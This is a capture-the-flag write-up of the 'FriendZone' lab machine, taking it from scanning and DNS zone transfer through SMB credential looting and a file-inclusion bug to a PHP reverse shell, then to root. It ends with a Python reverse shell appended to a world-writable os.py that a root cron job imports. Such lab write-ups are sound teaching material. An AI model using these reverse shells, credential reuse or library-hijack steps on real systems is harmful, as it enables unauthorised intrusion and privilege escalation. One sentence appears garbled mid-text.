---
published: false
---
Start of as we always do with nmap:
```
root@kali: nmap -sC -sV -oN nmap 10.10.10.123 
# Nmap 7.70 scan initiated Fri Mar 15 20:12:59 2019 as: nmap -sC -sV -oN nmap 10.10.10.123
Nmap scan report for 10.10.10.123
Host is up (0.23s latency).
Scanned at 2019-03-15 20:12:59 AEDT for 335902s
Not shown: 993 closed ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC4/mXYmkhp2syUwYpiTjyUAVgrXhoAJ3eEP/Ch7omJh1jPHn3RQOxqvy9w4M6mTbBezspBS+hu29tO2vZBubheKRKa/POdV5Nk+A+q3BzhYWPQA+A+XTpWs3biNgI/4pPAbNDvvts+1ti+sAv47wYdp7mQysDzzqtpWxjGMW7I1SiaZncoV9L+62i+SmYugwHM0RjPt0HHor32+ZDL0hed9p2ebczZYC54RzpnD0E/qO3EE2ZI4pc7jqf/bZypnJcAFpmHNYBUYzyd7l6fsEEmvJ5EZFatcr0xzFDHRjvGz/44pekQ40ximmRqMfHy1bs2j+e39NmsNSp6kAZmNIsx
|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOPI7HKY4YZ5NIzPESPIcP0tdhwt4NRep9aUbBKGmOheJuahFQmIcbGGrc+DZ5hTyGDrvlFzAZJ8coDDUKlHBjo=
|   256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIF+FZS11nYcVyJgJiLrTYTIy3ia5QvE3+5898MfMtGQl
53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Friend Zone Escape software
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp open  ssl/http    Apache httpd 2.4.29
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 404 Not Found
| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO/emailAddress=haha@friendzone.red/organizationalUnitName=CODERED/localityName=AMMAN
| Issuer: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO/emailAddress=haha@friendzone.red/organizationalUnitName=CODERED/localityName=AMMAN
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-10-05T21:02:30
| Not valid after:  2018-11-04T21:02:30
| MD5:   c144 1868 5e8b 468d fc7d 888b 1123 781c
| SHA-1: 88d2 e8ee 1c2c dbd3 ea55 2e5e cdd4 e94c 4c8b 9233
| -----BEGIN CERTIFICATE-----
| MIID+DCCAuCgAwIBAgIJAPRJYD8hBBg0MA0GCSqGSIb3DQEBCwUAMIGQMQswCQYD
| VQQGEwJKTzEQMA4GA1UECAwHQ09ERVJFRDEOMAwGA1UEBwwFQU1NQU4xEDAOBgNV
| BAoMB0NPREVSRUQxEDAOBgNVBAsMB0NPREVSRUQxFzAVBgNVBAMMDmZyaWVuZHpv
| bmUucmVkMSIwIAYJKoZIhvcNAQkBFhNoYWhhQGZyaWVuZHpvbmUucmVkMB4XDTE4
| MTAwNTIxMDIzMFoXDTE4MTEwNDIxMDIzMFowgZAxCzAJBgNVBAYTAkpPMRAwDgYD
| VQQIDAdDT0RFUkVEMQ4wDAYDVQQHDAVBTU1BTjEQMA4GA1UECgwHQ09ERVJFRDEQ
| MA4GA1UECwwHQ09ERVJFRDEXMBUGA1UEAwwOZnJpZW5kem9uZS5yZWQxIjAgBgkq
| hkiG9w0BCQEWE2hhaGFAZnJpZW5kem9uZS5yZWQwggEiMA0GCSqGSIb3DQEBAQUA
| A4IBDwAwggEKAoIBAQCjImsItIRhGNyMyYuyz4LWbiGSDRnzaXnHVAmZn1UeG1B8
| lStNJrR8/ZcASz+jLZ9qHG57k6U9tC53VulFS+8Msb0l38GCdDrUMmM3evwsmwrH
| 9jaB9G0SMGYiwyG1a5Y0EqhM8uEmR3dXtCPHnhnsXVfo3DbhhZ2SoYnyq/jOfBuH
| gBo6kdfXLlf8cjMpOje3dZ8grwWpUDXVUVyucuatyJam5x/w9PstbRelNJm1gVQh
| 7xqd2at/kW4g5IPZSUAufu4BShCJIupdgIq9Fddf26k81RQ11dgZihSfQa0HTm7Q
| ui3/jJDpFUumtCgrzlyaM5ilyZEj3db6WKHHlkCxAgMBAAGjUzBRMB0GA1UdDgQW
| BBSZnWAZH4SGp+K9nyjzV00UTI4zdjAfBgNVHSMEGDAWgBSZnWAZH4SGp+K9nyjz
| V00UTI4zdjAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUAA4IBAQBV6vjj
| TZlc/bC+cZnlyAQaC7MytVpWPruQ+qlvJ0MMsYx/XXXzcmLj47Iv7EfQStf2TmoZ
| LxRng6lT3yQ6Mco7LnnQqZDyj4LM0SoWe07kesW1GeP9FPQ8EVqHMdsiuTLZryME
| K+/4nUpD5onCleQyjkA+dbBIs+Qj/KDCLRFdkQTX3Nv0PC9j+NYcBfhRMJ6VjPoF
| Kwuz/vON5PLdU7AvVC8/F9zCvZHbazskpy/quSJIWTpjzg7BVMAWMmAJ3KEdxCoG
| X7p52yPCqfYopYnucJpTq603Qdbgd3bq30gYPwF6nbHuh0mq8DUxD9nPEcL8q6XZ
| fv9s+GxKNvsBqDBX
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
...
|_  http/1.1
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Hosts: FRIENDZONE, 127.0.0.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -34m35s, deviation: 1h09m16s, median: 5m23s
| nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   FRIENDZONE<00>       Flags: <unique><active>
|   FRIENDZONE<03>       Flags: <unique><active>
|   FRIENDZONE<20>       Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 60332/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 15016/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 3136/udp): CLEAN (Failed to receive data)
|   Check 4 (port 37865/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: friendzone
|   NetBIOS computer name: FRIENDZONE\x00
|   Domain name: \x00
|   FQDN: friendzone
|_  System time: 2019-03-15T11:18:42+02:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2019-03-15 20:18:43
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Mar 19 17:31:21 2019 -- 1 IP address (1 host up) scanned in 335902.56 seconds
```

We have vsftpd which we have seen before, but a quick searchsploit shows that version 3.0.3 is not the one with the backdoor vulnerability. Not that we don’t trust nmap, but just in case we try to connect to ftp as anonymous, but we can’t:
```
root@kali: ftp 10.10.10.123
Connected to 10.10.10.123.
220 (vsFTPd 3.0.3)
Name (10.10.10.123:root): anonymous
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
```
Moving on down the list we notice that it also has DNS, this could be open to a dns hijack or zone transfer to allow us to enumerate potential hidden domains or subdomains, without having to use things like gobuster or wfuzz for sub domains. To use tools like nslookup, DIG and host we need a domain name. Starting off with the usual suspects of friendzone.htb we notice that nothing seems to be valid. So we take a look at the website itself:

![253395020.png]({{site.baseurl}}/Images/Friendzone/253395020.png)

Looks like one potential candidate for a domain is friendzoneportal.red

So we add that to our hosts file and re-run our DNS tools.
```
kali :: ~/CTFs/friendzone # host -t axfr friendzoneportal.red 10.10.10.123     
Trying "friendzoneportal.red"
Using domain server:
Name: 10.10.10.123
Address: 10.10.10.123#53
Aliases: 

;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 28040
;; flags: qr aa; QUERY: 1, ANSWER: 9, AUTHORITY: 0, ADDITIONAL: 0

;; QUESTION SECTION:
;friendzoneportal.red.		IN	AXFR

;; ANSWER SECTION:
friendzoneportal.red.	604800	IN	SOA	localhost. root.localhost. 2 604800 86400 2419200 604800
friendzoneportal.red.	604800	IN	AAAA	::1
friendzoneportal.red.	604800	IN	NS	localhost.
friendzoneportal.red.	604800	IN	A	127.0.0.1
admin.friendzoneportal.red. 604800 IN	A	127.0.0.1
files.friendzoneportal.red. 604800 IN	A	127.0.0.1
imports.friendzoneportal.red. 604800 IN	A	127.0.0.1
vpn.friendzoneportal.red. 604800 IN	A	127.0.0.1
friendzoneportal.red.	604800	IN	SOA	localhost. root.localhost. 2 604800 86400 2419200 604800

Received 270 bytes from 10.10.10.123#53 in 240 ms
```

Let’s check all of these out in a web browser to see if we have apache virtualhost stuff going on.

Nothing on HTTP.. but hitting all the sub domains over HTTPS gives us something to work with:

![253984776.png]({{site.baseurl}}/Images/Friendzone/253984776.png)

Trying admin:admin:

![253919243.png]({{site.baseurl}}/Images/Friendzone/253919243.png)

Trying to repeat the results from our DNS zone transfer (because I forgot to save the output) I typoed the domain name and assumed from memory that it was friendzone.red, but it looks like it might have helped in our favour.
```
root@kali: host -t axfr friendzone.red 10.10.10.123 
Trying "friendzone.red"
Using domain server:
Name: 10.10.10.123
Address: 10.10.10.123#53
Aliases: 

;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 41005
;; flags: qr aa; QUERY: 1, ANSWER: 8, AUTHORITY: 0, ADDITIONAL: 0

;; QUESTION SECTION:
;friendzone.red.			IN	AXFR

;; ANSWER SECTION:
friendzone.red.		604800	IN	SOA	localhost. root.localhost. 2 604800 86400 2419200 604800
friendzone.red.		604800	IN	AAAA	::1
friendzone.red.		604800	IN	NS	localhost.
friendzone.red.		604800	IN	A	127.0.0.1
administrator1.friendzone.red. 604800 IN A	127.0.0.1
hr.friendzone.red.	604800	IN	A	127.0.0.1
uploads.friendzone.red.	604800	IN	A	127.0.0.1
friendzone.red.		604800	IN	SOA	localhost. root.localhost. 2 604800 86400 2419200 604800

Received 250 bytes from 10.10.10.123#53 in 237 ms
```

Hitting up the administrator1 sub domain over https we get a different website this time:

![253919255.png]({{site.baseurl}}/Images/Friendzone/253919255.png)

admin:admin does not work this time, we get presented with a nasty Wrong! 

Let’s give it a cheeky gobuster guys: 
```
gobuster -k -u https://files.friendzoneportal.red -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -o gobuster2.log -x txt,html,php

gobuster dir -k -u https://administrator1.friendzone.red -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -o gobuster.log -x txt,html,php
```
Looking to see if there is anything we can access on SMB we get an error while trying to connect as guest, but leaving out the user gets us a result:
```
root@kali: smbmap -H 10.10.10.123 
[+] Finding open SMB ports....
[+] Guest SMB session established on 10.10.10.123...
[+] IP: 10.10.10.123:445	Name: friendzoneportal.red                              
	Disk                                                  	Permissions
	----                                                  	-----------
	print$                                            	NO ACCESS
	Files                                             	NO ACCESS
	general                                           	READ ONLY
	Development                                       	READ, WRITE
	IPC$                                              	NO ACCESS

```
Using smbclient to connect to general to start:
```
root@kali: smbclient \\\\10.10.10.123\\general           
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Jan 17 07:10:51 2019
  ..                                  D        0  Thu Jan 24 08:51:02 2019
  creds.txt                           N       57  Wed Oct 10 10:52:42 2018

		9221460 blocks of size 1024. 6453020 blocks available
smb: \> get creds.txt
getting file \creds.txt of size 57 as creds.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
```

Looking at the contents of the file:
```
root@kali: cat creds.txt 
creds for the admin THING:
admin:WORKWORKHhallelujah@#
```

Heading over to our admin page, we use these credentials and get in:

![253984797.png]({{site.baseurl}}/Images/Friendzone/253984797.png)


We are told to head over to dashboard.php, (our gobuster also found this but we couldn’t access it without creds)

Before we go too far into the website we access the other smd share to see if we do actually have read/write access:
```
root@kali: smbclient \\\\10.10.10.123\\Development
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Fri Jul 12 19:38:45 2019
  ..                                  D        0  Thu Jan 24 08:51:02 2019

		9221460 blocks of size 1024. 6416492 blocks available
smb: \> put nmap
putting file nmap as \nmap (44.1 kb/s) (average 44.1 kb/s)
smb: \> dir
  .                                   D        0  Fri Jul 12 20:05:56 2019
  ..                                  D        0  Thu Jan 24 08:51:02 2019
  nmap                                A   106279  Fri Jul 12 20:05:58 2019

		9221460 blocks of size 1024. 6412192 blocks available
smb: \> 

```
Nice! I am sure this will come in handy later on.

Back at our dashboard.php:

![254017551.png]({{site.baseurl}}/Images/Friendzone/254017551.png)

Interestingly it says that we are missing a parameter and also tells us how to use it.. smells like there will be good potential for an LFI.

putting in the example we are presented with an image that appears to be mocking us. Looking at the page source, we can see that images are loaded from a /images with two images in it, a.jpg and b.jpg

But there doesn’t appear to be anything useful with the images, looking at the second argument, called pagename we replace that value with another php file we know exists, login.php and we see the contents of the login.php file when we entered the wrong credentials… For the lolz we enter dashboard and cause a glitch in the matrix that almost crashes firefox (infinitely recursive page include)k]\er and appending .php to see if there is a matching php file, then executing it. To test this theory we generate a basic php file and upload it to the Development share using smb:
```
smb: \> put thoseguys.php
putting file thoseguys.php as \thoseguys.php (0.0 kb/s) (average 33.9 kb/s)
```

Now all we need to do is figure out where the Development folder is on the machine. To do this we a list of root level directories using our local machine and use WFUZZ to automate the task:
```
root@kali: ls / > rootdirs.txt
root@kali: wfuzz -b FriendZoneAuth=e7749d0f4b4da5d03e6e9196fd1d18f1 -w rootdir.txt https://administrator1.friendzone.red/dashboard.php\?image_id\=a.jpg\&pagename\=/FUZZ/Development/thoseguys
...
000001:  C=200      0 L	      38 W	    354 Ch	  "0"
000002:  C=200      0 L	      38 W	    354 Ch	  "bin"
000003:  C=200      0 L	      38 W	    354 Ch	  "boot"
000004:  C=200      0 L	      38 W	    354 Ch	  "dev"
000005:  C=200      0 L	      38 W	    354 Ch	  "email"
000006:  C=200      0 L	      38 W	    358 Ch	  "etc"
000007:  C=200      0 L	      38 W	    354 Ch	  "home"
```

Be sure to include the cookie (`-b`) argument as we need to be logged in to see the dashboard.php page.

Running this we quickly see that etc returns a different length than the other pages. Heading back to the browser we see that it is in fact in /etc/Development!

Now that we know we have code execution, time to turn it into a shell!

For this we update our thoseguys.php file with [pentestmonkey’s reverse shell php file](http://pentestmonkey.net/tools/web-shells/php-reverse-shell) updating the ip and port and setting up a listener. Hitting the page we get a shell as www-data:
```
root@kali: nc -nlvp 1234
Listening on [0.0.0.0] (family 2, port 1234)
Connection from 10.10.10.123 44322 received!
Linux FriendZone 4.15.0-36-generic #39-Ubuntu SMP Mon Sep 24 16:19:09 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
 13:57:47 up  1:28,  0 users,  load average: 0.00, 0.00, 0.02
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

First of all we see if we can read the user.txt flag and we can!

Poking around at the file system we notice a mysql_data.conf file with some creds in it:
```
www-data@FriendZone:/var/www$ cat mysql_data.conf
cat mysql_data.conf
for development process this is the mysql creds for user friend

db_user=friend

db_pass=Agpyu12!0.213$

db_name=FZ
```

We remember that SSH is also on the box, so checking for credential reuse, we attempt to log in to SSH using the creds from the mysql_data file:
```
root@kali: ssh friend@10.10.10.123
The authenticity of host '10.10.10.123 (10.10.10.123)' can't be established.
ECDSA key fingerprint is SHA256:/CZVUU5zAwPEcbKUWZ5tCtCrEemowPRMQo5yRXTWxgw.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.10.123' (ECDSA) to the list of known hosts.
friend@10.10.10.123's password: Agpyu12!0.213$
Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-36-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

You have mail.
Last login: Thu Jan 24 01:20:15 2019 from 10.10.14.3
friend@FriendZone:~$ 

```
Now that we are in as user. we need to escalate. Sudo and the usual enumeration helps, but nothing we can leaverage yet. So we make use of a tool. use SCP to copy pspy onto the box and have it running in the background while we manually do some enumeration.
```
root@kali: scp pspy64 friend@10.10.10.123:/tmp/.pspy64
...
root@kali: ssh friend@10.10.10.123
...
friend@FriendZone:/tmp$ chmod 755 .pspy64 
friend@FriendZone:/tmp$ ./.pspy64 -f
...
2019/07/12 14:12:01 CMD: UID=0    PID=2015   | /usr/bin/python /opt/server_admin/reporter.py 
2019/07/12 14:12:01 CMD: UID=0    PID=2014   | /bin/sh -c /opt/server_admin/reporter.py 
2019/07/12 14:12:01 CMD: UID=0    PID=2013   | /usr/sbin/CRON -f 
2019/07/12 14:12:01 FS:                 OPEN | /usr/lib/python2.7/site.py
2019/07/12 14:12:01 FS:                 OPEN | /usr/lib/python2.7/site.pyc
2019/07/12 14:12:01 FS:               ACCESS | /usr/lib/python2.7/site.pyc
2019/07/12 14:12:01 FS:        CLOSE_NOWRITE | /usr/lib/python2.7/site.pyc
2019/07/12 14:12:01 FS:                 OPEN | /usr/lib/python2.7/os.py
2019/07/12 14:12:01 FS:                 OPEN | /usr/lib/python2.7/os.pyc
2019/07/12 14:12:01 FS:               ACCESS | /usr/lib/python2.7/os.pyc
2019/07/12 14:12:01 FS:        CLOSE_NOWRITE | /usr/lib/python2.7/os.pyc
2019/07/12 14:12:01 FS:                 OPEN | /usr/lib/python2.7/posixpath.py
20
```
Coming back to pspy we notice that there is a script running regularly as root. time to take a look at it:
```
friend@FriendZone:~$ cat /opt/server_admin/reporter.py
#!/usr/bin/python

import os

to_address = "admin1@friendzone.com"
from_address = "admin2@friendzone.com"

print "[+] Trying to send email to %s"%to_address

#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''

#os.system(command)

# I need to edit the script later
# Sam ~ python developer
```

Doesn’t look like it does much of anything except import the os library, so maybe we can hijack that to run our code instead.

We have done this sort of thing before, but we needed write permissions to the directory the script was running from. This time we don’t have that, but we notice from our pspy output that it is loading a file at `/usr/lib/python2.7/os.py` what are the chances we have write permissions?
```
friend@FriendZone:~$ ls -la /usr/lib/python2.7/os.py
-rwxrwxrwx 1 root root 25910 Jan 15 22:19 /usr/lib/python2.7/os.py
```

Wow! Ok looks like a good option. Time to get to it.

Heading back to pentestmonkey to grab the pyton reverse shell one liner and expand it out to be proper python code by removing all the semi colons and placing the code at the bottom of the script. Because we are already in the os library we can also remove all the os. sections., we take over the `os.py` file with our shell:
```
friend@FriendZone:~$ nano /usr/lib/python2.7/os.py
... Rest of os.py

import socket,subprocess
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.11",1337))
dup2(s.fileno(),0)
dup2(s.fileno(),1) 
dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"]) 
```

Then we set up our listener and hope for the best:
```
root@kali: nc -nlvp 1337 
```

Once the cron triggers the script again we get a root shell and can read the flag:
```
root@kali: nc -nlvp 1337 
Listening on [0.0.0.0] (family 2, port 1337)
Connection from 10.10.10.123 55250 received!
/bin/sh: 0: can't access tty; job control turned off
# cat /root/root.txt
b0e6[REDACTED]90c7
# 
```